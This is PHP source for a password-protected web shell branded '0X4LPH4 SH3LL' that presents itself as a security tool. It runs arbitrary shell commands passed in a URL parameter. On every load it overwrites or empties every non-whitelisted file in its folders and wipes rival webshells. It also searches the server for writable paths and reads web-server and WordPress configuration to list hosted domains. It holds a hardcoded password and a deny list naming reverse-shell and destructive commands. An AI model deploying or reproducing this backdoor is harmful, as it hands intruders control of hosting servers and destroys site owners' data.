<?php
// ============= SUPER MOD SECURITY BY 0X4LPH4 =============
$SESSION_TIMEOUT = 1800; // Session timeout in seconds (30 minutes)

session_start();

// ============= LOGIN SYSTEM =============
$DEFAULT_PASSWORD = 'GeoDevz69#'; // Default password

// ============= CRITICAL SECURITY: BLOCK ALL NON-0X4LPH4 AND NON-INDEX.PHP FILES =============
function secureCurrentDirectory() {
    $current_dir = realpath(dirname(__FILE__));
    $current_script = basename(__FILE__);
    $blocked_count = 0;
    
    // Files to ALLOW (whitelist)
    $whitelist = [
        $current_script,                    // This script
        '0x4LPH4.php', '0x4lph4.php', '0X4LPH4.php',
        '0x4LPH4.html', '0x4lph4.html', '0X4LPH4.html',
        '0x4LPH4.txt', '0x4lph4.txt', '0X4LPH4.txt',
        'index.php', 'index.html', 'index.htm',          // Allow index files
        '.htaccess', '.htpasswd',
        'robots.txt', 'favicon.ico', 'sitemap.xml'
    ];
    
    // Get all files in current directory
    if (is_dir($current_dir)) {
        $files = scandir($current_dir);
        
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') {
                continue;
            }
            
            $file_path = $current_dir . '/' . $file;
            $file_lower = strtolower($file);
            $is_whitelisted = false;
            
            // Check if file is whitelisted
            foreach ($whitelist as $allowed_file) {
                if (strtolower($file) === strtolower($allowed_file)) {
                    $is_whitelisted = true;
                    break;
                }
            }
            
            // Check if it's a 0x4LPH4 file (case-insensitive)
            if (preg_match('/^0x4lph4\.(php|html|txt)$/i', $file)) {
                $is_whitelisted = true;
            }
            
            // Check if it's an index file
            if (preg_match('/^index\.(php|html|htm)$/i', $file)) {
                $is_whitelisted = true;
            }
            
            // Block non-whitelisted files
            if (!$is_whitelisted && is_file($file_path)) {
                $file_ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                
                if (in_array($file_ext, ['php', 'phtml', 'phps', 'php5', 'php7', 'php4', 'inc'])) {
                    // Block PHP files with blank content
                    $blocked_content = "<?php\n// ============= BLOCKED BY 0X4LPH4 SECURITY =============\n";
                    $blocked_content .= "// This file has been automatically blocked for security\n";
                    $blocked_content .= "// Only 0x4LPH4 files and index.php are allowed in this directory\n";
                    $blocked_content .= "// Blocked at: " . date('Y-m-d H:i:s') . "\n";
                    $blocked_content .= "// IP: " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN') . "\n\n";
                    $blocked_content .= "// Show blank page for all requests\n";
                    $blocked_content .= "header('HTTP/1.0 404 Not Found');\n";
                    $blocked_content .= "header('Content-Type: text/html');\n";
                    $blocked_content .= "echo '';\n";
                    $blocked_content .= "exit;\n?>";
                    
                    @file_put_contents($file_path, $blocked_content);
                    @chmod($file_path, 0444); // Read-only
                    $blocked_count++;
                    
                } else if (is_file($file_path)) {
                    // For non-PHP files, make them empty or minimal
                    if (in_array($file_ext, ['html', 'htm', 'txt', 'js', 'css', 'xml', 'json'])) {
                        // Make empty but keep file
                        @file_put_contents($file_path, '');
                    } else {
                        // For images/media, replace with 1x1 pixel
                        if (in_array($file_ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])) {
                            // Create tiny transparent PNG
                            $tiny_png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==');
                            @file_put_contents($file_path, $tiny_png);
                        } else {
                            @file_put_contents($file_path, '');
                        }
                    }
                    @chmod($file_path, 0444);
                    $blocked_count++;
                }
            }
        }
    }
    
    // Also block files in subdirectories (but don't touch subdir index.php files)
    $subdirs = glob($current_dir . '/*', GLOB_ONLYDIR);
    foreach ($subdirs as $subdir) {
        $subdir_name = basename($subdir);
        // Skip certain directories
        if (in_array($subdir_name, ['.', '..', 'cgi-bin', 'images', 'css', 'js', 'uploads', 'wp-content', 'wp-includes'])) {
            continue;
        }
        
        $subfiles = scandir($subdir);
        foreach ($subfiles as $subfile) {
            if ($subfile === '.' || $subfile === '..') {
                continue;
            }
            
            $subfile_path = $subdir . '/' . $subfile;
            $subfile_lower = strtolower($subfile);
            
            // Skip index.php in subdirectories (allow them)
            if (preg_match('/^index\.(php|html|htm)$/i', $subfile)) {
                continue;
            }
            
            // Skip 0x4LPH4 files in subdirectories
            if (preg_match('/^0x4lph4\.(php|html|txt)$/i', $subfile)) {
                continue;
            }
            
            // Block all other files in subdirectories
            if (is_file($subfile_path)) {
                $subfile_ext = strtolower(pathinfo($subfile, PATHINFO_EXTENSION));
                
                if (in_array($subfile_ext, ['php', 'phtml', 'phps', 'php5', 'php7', 'php4', 'inc'])) {
                    $blocked_content = "<?php\n// ============= BLOCKED BY 0X4LPH4 SECURITY =============\n";
                    $blocked_content .= "// This file has been automatically blocked for security\n";
                    $blocked_content .= "// Blocked at: " . date('Y-m-d H:i:s') . "\n";
                    $blocked_content .= "// IP: " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN') . "\n\n";
                    $blocked_content .= "header('HTTP/1.0 404 Not Found');\n";
                    $blocked_content .= "echo '';\n";
                    $blocked_content .= "exit;\n?>";
                    
                    @file_put_contents($subfile_path, $blocked_content);
                    @chmod($subfile_path, 0444);
                    $blocked_count++;
                } else {
                    @file_put_contents($subfile_path, '');
                    @chmod($subfile_path, 0444);
                    $blocked_count++;
                }
            }
        }
    }
    
    return $blocked_count;
}

// ============= AUTO-SECURE ON EVERY PAGE LOAD =============
$blocked_files_count = secureCurrentDirectory();

// ============= BLOCK DIRECT ACCESS TO NON-ALLOWED FILES =============
if (isset($_SERVER['REQUEST_URI'])) {
    $requested_uri = $_SERVER['REQUEST_URI'];
    $url_path = parse_url($requested_uri, PHP_URL_PATH);
    
    if ($url_path) {
        $requested_file = basename($url_path);
        $current_script = basename(__FILE__);
        
        // If accessing a file (not directory)
        if ($requested_file !== '' && $requested_file !== '/') {
            // Check if it's allowed
            $is_allowed = false;
            
            // Allow this script
            if ($requested_file === $current_script) {
                $is_allowed = true;
            }
            
            // Allow 0x4LPH4 files
            if (preg_match('/^0x4lph4\.(php|html|txt)$/i', $requested_file)) {
                $is_allowed = true;
            }
            
            // Allow index files
            if (preg_match('/^index\.(php|html|htm)$/i', $requested_file)) {
                $is_allowed = true;
            }
            
            // Allow essential files
            $essential_files = ['.htaccess', '.htpasswd', 'robots.txt', 'favicon.ico', 'sitemap.xml'];
            foreach ($essential_files as $essential) {
                if (strtolower($requested_file) === strtolower($essential)) {
                    $is_allowed = true;
                    break;
                }
            }
            
            // BLOCK if not allowed
            if (!$is_allowed) {
                // Check if file exists and is blocked
                $requested_path = realpath(dirname(__FILE__)) . '/' . $requested_file;
                if (file_exists($requested_path)) {
                    $file_ext = strtolower(pathinfo($requested_file, PATHINFO_EXTENSION));
                    
                    if (in_array($file_ext, ['php', 'phtml', 'phps', 'php5', 'php7', 'php4', 'inc'])) {
                        // For PHP files that slipped through, block them now
                        $blocked_content = "<?php\n// ============= BLOCKED BY 0X4LPH4 SECURITY =============\n";
                        $blocked_content .= "// This file has been automatically blocked for security\n";
                        $blocked_content .= "// Blocked on access: " . date('Y-m-d H:i:s') . "\n";
                        $blocked_content .= "// IP: " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN') . "\n\n";
                        $blocked_content .= "header('HTTP/1.0 404 Not Found');\n";
                        $blocked_content .= "echo '';\n";
                        $blocked_content .= "exit;\n?>";
                        
                        @file_put_contents($requested_path, $blocked_content);
                        @chmod($requested_path, 0444);
                    }
                }
                
                // Show blank page
                header("HTTP/1.0 404 Not Found");
                header("Content-Type: text/html");
                echo ""; // Blank page
                exit;
            }
        }
    }
}

// Check if user is logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // Check if password was submitted
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $DEFAULT_PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['writable_path'] = realpath(dirname(__FILE__)); // Use realpath
        } else {
            $login_error = "Invalid password!";
        }
    }
    
    // Show login form if not logged in
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login Required - 0X4LPH4 Security</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #1a1a1a;
                    color: #fff;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-image: url('https://i.ibb.co/DDmnztxr/20251208-093450.png');
                    background-size: cover;
                    background-position: center;
                    background-repeat: no-repeat;
                }
                .login-box {
                    background-color: rgba(45, 45, 45, 0.95);
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 20px rgba(0,0,0,0.8);
                    width: 320px;
                    text-align: center;
                    border: 1px solid #4CAF50;
                }
                .login-box h2 {
                    color: #4CAF50;
                    text-align: center;
                    margin-bottom: 20px;
                    font-size: 24px;
                }
                .login-form {
                    display: flex;
                    flex-direction: column;
                    gap: 15px;
                }
                .login-box input[type="password"] {
                    width: 100%;
                    padding: 12px 10px;
                    border: 1px solid #444;
                    border-radius: 5px;
                    background-color: #333;
                    color: #fff;
                    font-size: 14px;
                    box-sizing: border-box;
                }
                .login-box input[type="submit"] {
                    width: 100%;
                    padding: 12px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 16px;
                    transition: background-color 0.3s;
                }
                .login-box input[type="submit"]:hover {
                    background-color: #45a049;
                }
                .error {
                    color: #ff4444;
                    text-align: center;
                    margin-bottom: 15px;
                    font-size: 14px;
                }
                .brand-title {
                    color: #4CAF50;
                    font-size: 28px;
                    font-weight: bold;
                    margin-bottom: 10px;
                    text-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
                }
                .subtitle {
                    color: #aaa;
                    margin-bottom: 25px;
                    font-size: 14px;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="brand-title">0X4LPH4 SH3LL</div>
                <div class="subtitle">Secure Access Panel</div>
                <?php if (isset($login_error)) echo "<p class='error'>$login_error</p>"; ?>
                <form method="POST" action="" class="login-form">
                    <input type="password" name="password" placeholder="Enter password" required autofocus>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Check session timeout
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $SESSION_TIMEOUT) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Update login time on activity
$_SESSION['login_time'] = time();

// Get current script filename for protection
$current_script = basename(__FILE__);

// Initialize writable path if not set
if (!isset($_SESSION['writable_path'])) {
    $_SESSION['writable_path'] = realpath(dirname(__FILE__));
}

// ============= ADVANCED WEBSHELL DETECTION & PROTECTION =============
function scanForWebshells() {
    $current_dir = realpath(dirname(__FILE__));
    $current_script = basename(__FILE__);
    
    $webshell_patterns = [
        '/eval\s*\(/i',
        '/base64_decode\s*\(/i',
        '/system\s*\(/i',
        '/shell_exec\s*\(/i',
        '/exec\s*\(/i',
        '/passthru\s*\(/i',
        '/popen\s*\(/i',
        '/proc_open\s*\(/i',
        '/assert\s*\(/i',
        '/preg_replace\s*\(\s*["\']\/\.\*["\']/i',
        '/create_function\s*\(/i',
        '/\$_GET\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_POST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_REQUEST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_COOKIE\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/gzuncompress\s*\(\s*base64_decode/i',
        '/gzinflate\s*\(\s*base64_decode/i',
        '/str_rot13\s*\(/i',
        '/include\s*\(\s*\$_/i',
        '/require\s*\(\s*\$_/i',
        '/include_once\s*\(\s*\$_/i',
        '/require_once\s*\(\s*\$_/i',
        '/`.*`/',
        '/<\?php\s+echo\s+\$_/i',
    ];
    
    $dangerous_extensions = ['.php', '.phtml', '.phps', '.php5', '.php7', '.php4', '.inc', '.pl', '.cgi', '.py', '.sh', '.html', '.htm', '.txt', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico', '.js', '.css'];
    $webshells_found = [];
    
    $files = scandir($current_dir);
    foreach ($files as $file) {
        $file_path = $current_dir . '/' . $file;
        
        if ($file === $current_script || $file === '.' || $file === '..') {
            continue;
        }
        
        // Skip allowed files
        if (preg_match('/^0x4lph4\.(php|html|txt)$/i', $file)) {
            continue;
        }
        
        if (preg_match('/^index\.(php|html|htm)$/i', $file)) {
            continue;
        }
        
        if (is_file($file_path)) {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $full_ext = '.' . $ext;
            
            if (in_array($full_ext, $dangerous_extensions)) {
                $content = @file_get_contents($file_path);
                if ($content) {
                    // Check for webshell patterns
                    foreach ($webshell_patterns as $pattern) {
                        if (preg_match($pattern, $content)) {
                            $webshells_found[] = $file_path;
                            
                            $neutralized_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
                            $neutralized_content .= "// 0x4LPH4 file cleaned - webshell detected\n";
                            $neutralized_content .= "// Detected at: " . date('Y-m-d H:i:s') . "\n";
                            $neutralized_content .= "// IP: " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN') . "\n";
                            $neutralized_content .= "header('HTTP/1.0 404 Not Found');\n";
                            $neutralized_content .= "echo '';\n";
                            $neutralized_content .= "exit;\n?>";
                            
                            @file_put_contents($file_path, $neutralized_content);
                            @chmod($file_path, 0444);
                            break;
                        }
                    }
                }
            }
        }
    }
    
    return $webshells_found;
}

// ============= FIND WRITABLE PATH FUNCTION =============
function findWritablePaths() {
    $common_paths = [
        '/var/www/html',
        '/home',
        '/tmp',
        '/var/tmp',
        '/opt',
        '/usr/local',
        '/home/*/public_html',
        '/home/*/domains/*/public_html',
        '/home/*/www',
        '/var/www',
        '/srv/http'
    ];
    
    $writable_paths = [];
    
    foreach ($common_paths as $path) {
        if (strpos($path, '*') !== false) {
            // Handle wildcard paths
            $expanded_paths = glob($path, GLOB_ONLYDIR);
            foreach ($expanded_paths as $expanded_path) {
                $real_path = realpath($expanded_path);
                if ($real_path && is_writable($real_path)) {
                    $writable_paths[] = $real_path;
                }
            }
        } else {
            $real_path = realpath($path);
            if ($real_path && is_dir($real_path) && is_writable($real_path)) {
                $writable_paths[] = $real_path;
            }
        }
    }
    
    // Also check current directory and parent directories
    $current_dir = realpath(dirname(__FILE__));
    $parent_dirs = [
        $current_dir,
        dirname($current_dir),
        dirname(dirname($current_dir))
    ];
    
    foreach ($parent_dirs as $dir) {
        $real_dir = realpath($dir);
        if ($real_dir && is_dir($real_dir) && is_writable($real_dir)) {
            $writable_paths[] = $real_dir;
        }
    }
    
    return array_unique($writable_paths);
}

// ============= ENHANCED DOMAIN DETECTION =============
function findConnectedDomains() {
    $domains = [];
    
    // Get server name
    if (isset($_SERVER['SERVER_NAME'])) {
        $domains[] = $_SERVER['SERVER_NAME'];
    }
    
    // Check for WordPress multisite
    $current_path = realpath(dirname(__FILE__));
    $wp_config_path = $current_path . '/wp-config.php';
    
    if (file_exists($wp_config_path)) {
        $wp_content = @file_get_contents($wp_config_path);
        if ($wp_content) {
            // Extract site URL and home URL
            if (preg_match("/define\s*\(\s*'WP_SITEURL'\s*,\s*'([^']+)'/", $wp_content, $matches)) {
                $url = parse_url($matches[1]);
                if (isset($url['host'])) {
                    $domains[] = $url['host'];
                }
            }
            if (preg_match("/define\s*\(\s*'WP_HOME'\s*,\s*'([^']+)'/", $wp_content, $matches)) {
                $url = parse_url($matches[1]);
                if (isset($url['host'])) {
                    $domains[] = $url['host'];
                }
            }
        }
    }
    
    // Check Apache/Nginx configs for virtual hosts
    $config_paths = [
        '/etc/apache2/sites-enabled',
        '/etc/apache2/sites-available',
        '/etc/httpd/sites-enabled',
        '/etc/httpd/sites-available',
        '/etc/nginx/sites-enabled',
        '/etc/nginx/sites-available'
    ];
    
    foreach ($config_paths as $config_path) {
        if (is_dir($config_path)) {
            $config_files = glob($config_path . '/*');
            foreach ($config_files as $config_file) {
                if (is_file($config_file)) {
                    $content = @file_get_contents($config_file);
                    if ($content) {
                        // Extract ServerName and ServerAlias
                        if (preg_match_all('/ServerName\s+([^\s\n]+)/', $content, $server_name_matches)) {
                            foreach ($server_name_matches[1] as $server_name) {
                                $domains[] = trim($server_name);
                            }
                        }
                        if (preg_match_all('/ServerAlias\s+([^\n]+)/', $content, $server_alias_matches)) {
                            foreach ($server_alias_matches[1] as $aliases) {
                                $alias_list = preg_split('/\s+/', $aliases);
                                foreach ($alias_list as $alias) {
                                    $alias = trim($alias);
                                    if (!empty($alias)) {
                                        $domains[] = $alias;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    return array_unique($domains);
}

$detected_webshells = scanForWebshells();
$connected_domains = findConnectedDomains();
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 20px;
        }
        .header {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #4CAF50;
        }
        .header h1 {
            color: #4CAF50;
            margin: 0;
            font-size: 28px;
        }
        form {
            background-color: #2d2d2d;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #444;
        }
        input[type="text"] {
            width: 70%;
            padding: 10px;
            background-color: #333;
            border: 1px solid #444;
            color: #fff;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #000;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid #333;
        }
        .info-box {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border: 1px solid #444;
        }
        .logout-btn {
            float: right;
            background-color: #ff4444;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        .logout-btn:hover {
            background-color: #cc0000;
        }
        .cmd-error {
            color: #ff6b6b;
        }
        .cmd-success {
            color: #4CAF50;
        }
        .cmd-output {
            color: #ffffff;
        }
        .user-info {
            color: #4CAF50;
            font-weight: bold;
        }
        .wget-fix {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            border-left: 4px solid #4CAF50;
        }
        .path-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #2196F3;
        }
        .move-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #ff9800;
        }
        .domain-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #9C27B0;
        }
        .security-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #ff4444;
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="?logout" class="logout-btn">Logout</a>
        <h1>0X4LPH4 SH3LL Console</h1>
        <p>Logged in as: <span class="user-info">0X4LPH4</span> | Session timeout: 30 minutes</p>
        
        <?php
        if (isset($_GET['logout'])) {
            session_destroy();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
        
        if ($blocked_files_count > 0) {
            echo '<p style="color: #ff4444; font-weight: bold;">🔒 SECURITY: Blocked ' . $blocked_files_count . ' non-allowed files</p>';
        }
        
        if (!empty($detected_webshells)) {
            echo '<p style="color: #ff4444; font-weight: bold;">⚠ Controlled by 0x4LPH4: ' . count($detected_webshells) . ' webshells neutralized!</p>';
        }
        ?>
    </div>
    
    <div class="security-box">
        <strong>🛡️ ACTIVE SECURITY PROTECTION:</strong><br>
        ✓ ALLOWED: 0x4LPH4.php, 0x4LPH4.html, 0x4LPH4.txt<br>
        ✓ ALLOWED: index.php, index.html, index.htm<br>
        ✓ BLOCKED: ALL other files (.txt, .html, .php, etc.)<br>
        ✓ Automatic file blocking on injection<br>
        ✓ Real-time access blocking<br>
        <small>Security active since: <?php echo date('Y-m-d H:i:s'); ?></small>
    </div>
    
    <div class="domain-box">
        <strong>🌐 CONNECTED DOMAINS FOUND:</strong><br>
        <?php
        if (!empty($connected_domains)) {
            foreach ($connected_domains as $domain) {
                echo "• " . htmlspecialchars($domain) . "<br>";
            }
        } else {
            echo "No additional domains detected<br>";
        }
        ?>
    </div>
    
    <div class="path-box">
        <strong>📍 CURRENT WRITABLE PATH:</strong><br>
        <?php echo htmlspecialchars($_SESSION['writable_path']); ?><br>
        <strong>To change writable path:</strong> <code>setwritable /new/path/here</code>
    </div>
    
    <div class="move-box">
        <strong>🚀 MOVE/COPY 0X4LPH4 FILES:</strong><br>
        <code>mv 0x4LPH4.php /new/path/0x4LPH4.php</code><br>
        <code>cp 0x4LPH4.php /new/path/0x4LPH4.php</code><br>
        <strong>Note:</strong> New location will automatically block all non-allowed files<br>
        <strong>Example:</strong> <code>mv 0x4LPH4.php /var/www/html/admin/0x4LPH4.php</code>
    </div>
    
    <form method="GET" name="cmd_form">
        Command: <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter command (e.g., ls -la, mv, cp, findwritable)...">
        <input type="submit" value="Execute">
    </form>
    
    <hr>
    
<pre>
<?php
if (isset($_GET['cmd'])) {
    $command = trim($_GET['cmd']);
    
    if (!empty($command)) {
        $script_name = $current_script;
        
        // ============= SPECIAL COMMANDS =============
        // Handle findwritable command
        if ($command === 'findwritable') {
            $writable_paths = findWritablePaths();
            if (!empty($writable_paths)) {
                echo "<span class='cmd-success'>✓ Found " . count($writable_paths) . " writable paths:</span>\n";
                foreach ($writable_paths as $path) {
                    echo "<span class='cmd-output'>• " . htmlspecialchars($path) . "</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ No writable paths found</span>\n";
            }
            goto end_processing;
        }
        
        // Handle finddomains command
        if ($command === 'finddomains') {
            $domains = findConnectedDomains();
            if (!empty($domains)) {
                echo "<span class='cmd-success'>✓ Found " . count($domains) . " connected domains:</span>\n";
                foreach ($domains as $domain) {
                    echo "<span class='cmd-output'>• " . htmlspecialchars($domain) . "</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ No additional domains found</span>\n";
            }
            goto end_processing;
        }
        
        // Handle setwritable command
        if (preg_match('/^setwritable\s+(.+)$/i', $command, $matches)) {
            $new_path = trim($matches[1]);
            $real_path = realpath($new_path);
            if ($real_path && is_dir($real_path) && is_writable($real_path)) {
                $_SESSION['writable_path'] = $real_path;
                echo "<span class='cmd-success'>✓ Writable path changed to: " . htmlspecialchars($real_path) . "</span>\n";
                
                // Auto-block files in new path
                chdir($real_path);
                $new_blocked = secureCurrentDirectory();
                chdir(dirname(__FILE__));
                
                if ($new_blocked > 0) {
                    echo "<span class='cmd-success'>✓ Auto-blocked " . $new_blocked . " non-allowed files in new location</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ Path is not writable or doesn't exist: " . htmlspecialchars($new_path) . "</span>\n";
            }
            goto end_processing;
        }
        
        // Handle testwrite command
        if (preg_match('/^testwrite\s+(.+)$/i', $command, $matches)) {
            $test_path = trim($matches[1]);
            $real_path = realpath($test_path);
            if ($real_path) {
                if (is_dir($real_path)) {
                    if (is_writable($real_path)) {
                        echo "<span class='cmd-success'>✓ Path is writable: " . htmlspecialchars($real_path) . "</span>\n";
                    } else {
                        echo "<span class='cmd-error'>✗ Path is NOT writable: " . htmlspecialchars($real_path) . "</span>\n";
                    }
                } else {
                    echo "<span class='cmd-error'>✗ Not a directory: " . htmlspecialchars($real_path) . "</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ Path doesn't exist: " . htmlspecialchars($test_path) . "</span>\n";
            }
            goto end_processing;
        }
        
        // Handle securepath command - manually secure a path
        if (preg_match('/^securepath\s+(.+)$/i', $command, $matches)) {
            $secure_path = trim($matches[1]);
            $real_path = realpath($secure_path);
            if ($real_path && is_dir($real_path)) {
                $old_dir = getcwd();
                chdir($real_path);
                $secured_count = secureCurrentDirectory();
                chdir($old_dir);
                
                echo "<span class='cmd-success'>✓ Secured path: " . htmlspecialchars($real_path) . "</span>\n";
                echo "<span class='cmd-success'>✓ Blocked " . $secured_count . " non-allowed files</span>\n";
            } else {
                echo "<span class='cmd-error'>✗ Path doesn't exist: " . htmlspecialchars($secure_path) . "</span>\n";
            }
            goto end_processing;
        }
        
        // ============= COMMAND VALIDATION =============
        $dangerous_patterns = [
            '/^rm\s+-rf\s+\/\s*$/',
            '/^rm\s+-rf\s+\/etc\s*$/',
            '/^rm\s+-rf\s+\/bin\s*$/',
            '/^rm\s+-rf\s+\/sbin\s*$/',
            '/^rm\s+-rf\s+\/usr\s*$/',
            '/^rm\s+-rf\s+\/var\s*$/',
            '/^rm\s+-rf\s+\/lib\s*$/',
            '/^rm\s+-rf\s+\/boot\s*$/',
            '/^rm\s+-rf\s+\/root\s*$/',
            '/^rm\s+-rf\s+\/home\s*$/',
            '/^rm\s+-rf\s+\/sys\s*$/',
            '/^rm\s+-rf\s+\/proc\s*$/',
            '/^rm\s+-rf\s+\/dev\s*$/',
            '/^rm\s+-rf\s+\/mnt\s*$/',
            '/^rm\s+-rf\s+\/opt\s*$/',
            '/^rm\s+-rf\s+\/srv\s*$/',
            '/^rm\s+-rf\s+\/tmp\s*$/',
            '/rm.*\/etc\/passwd.*/i',
            '/rm.*\/etc\/shadow.*/i',
            '/rm.*\/etc\/group.*/i',
            '/rm.*\/etc\/sudoers.*/i',
            '/rm.*\/etc\/hosts.*/i',
            '/rm.*\/etc\/network.*/i',
            '/rm.*\/var\/log.*/i',
            '/nc\s+.*-e\s+/i',
            '/bash\s+-i\s+>/',
            '/sh\s+-i\s+>/',
            '/dd\s+if=\/dev\/.*of=\/dev\/sda/i',
            '/mkfs\s+/i',
            '/:\(\)\{\s*:\|:\s*\&\s*\};:/',
            '/nmap\s+/i',
            '/nikto\s+/i',
            '/killall\s+/i',
            '/pkill\s+/i',
        ];
        
        $blocked = false;
        $block_reason = '';
        
        $is_download_command = false;
        if (preg_match('/^(wget|curl)\s+/i', $command)) {
            $is_download_command = true;
        }
        
        foreach ($dangerous_patterns as $pattern) {
            if (preg_match($pattern, $command)) {
                $block_reason = "Command blocked, Controlled by 0X4LPH4 - dangerous operation detected";
                $blocked = true;
                break;
            }
        }
        
        // ============= ALLOW MOVING/COPYING 0X4LPH4 FILES =============
        $is_move_command = preg_match('/^\s*(mv|cp)\s+/i', $command);
        $is_special_command = preg_match('/^(findwritable|setwritable|testwrite|finddomains|securepath)/i', $command);
        
        // Allow mv/cp commands
        if (!$blocked && $is_move_command) {
            if (preg_match('/^\s*(mv|cp)\s+([^\s]+)\s+([^\s&|;]+)/i', $command, $matches)) {
                $source_file = trim($matches[2], "'\"");
                $target_file = trim($matches[3], "'\"");
                
                // Check if moving 0x4LPH4 file
                $source_basename = basename($source_file);
                $is_0x4lph4_source = preg_match('/^0x4lph4\.(php|html|txt)$/i', $source_basename);
                
                if ($is_0x4lph4_source) {
                    // Target must also be 0x4LPH4 file
                    $target_basename = basename($target_file);
                    $is_0x4lph4_target = preg_match('/^0x4lph4\.(php|html|txt)$/i', $target_basename);
                    
                    if (!$is_0x4lph4_target) {
                        // Auto-rename to 0x4LPH4 format
                        $target_dir = dirname($target_file);
                        $target_ext = pathinfo($target_file, PATHINFO_EXTENSION);
                        if (empty($target_ext)) $target_ext = 'php';
                        $new_target = $target_dir . '/0x4LPH4.' . $target_ext;
                        $command = str_replace($target_file, $new_target, $command);
                        $target_file = $new_target;
                        echo "<span class='cmd-success'>⚠ Target auto-renamed to 0x4LPH4 format</span>\n";
                    }
                    
                    // Auto-block in target directory after move
                    $target_dir = dirname($target_file);
                    $real_target_dir = realpath($target_dir);
                    if ($real_target_dir) {
                        $old_dir = getcwd();
                        chdir($real_target_dir);
                        $secured = secureCurrentDirectory();
                        chdir($old_dir);
                        
                        if ($secured > 0) {
                            echo "<span class='cmd-success'>✓ Auto-secured target directory (" . $secured . " files blocked)</span>\n";
                        }
                    }
                }
            }
        }
        
        if (!$blocked && strlen($command) > 2000) {
            $block_reason = "Command blocked, Controlled by 0X4LPH4 - command too long";
            $blocked = true;
        }
        
        // Execute command if not blocked
        if (!$blocked) {
            $output = [];
            $return_var = 0;
            
            set_time_limit(8);
            
            // Use exec for simplicity
            exec($command . ' 2>&1', $output, $return_var);
            
            // Output results
            if (!empty($output)) {
                foreach ($output as $line) {
                    if (preg_match('/(command not found|No such file or directory|Permission denied|error:|failed:|cannot)/i', $line)) {
                        echo "<span class='cmd-error'>" . htmlspecialchars($line) . "</span>\n";
                    } else {
                        echo "<span class='cmd-output'>" . htmlspecialchars($line) . "</span>\n";
                    }
                }
            }
            
            if ($return_var !== 0) {
                if (empty($output)) {
                    echo "<span class='cmd-error'>✗ Command failed (exit code: $return_var)</span>\n";
                } else {
                    echo "<span class='cmd-error'>✗ Command exited with status: $return_var</span>\n";
                }
            } else {
                if (empty($output)) {
                    echo "<span class='cmd-success'>✓ Command executed successfully</span>\n";
                } else {
                    echo "<span class='cmd-success'>✓ Command executed successfully</span>\n";
                }
            }
        } else {
            echo "<span class='cmd-error'>$block_reason</span>\n";
        }
        
        end_processing:
        
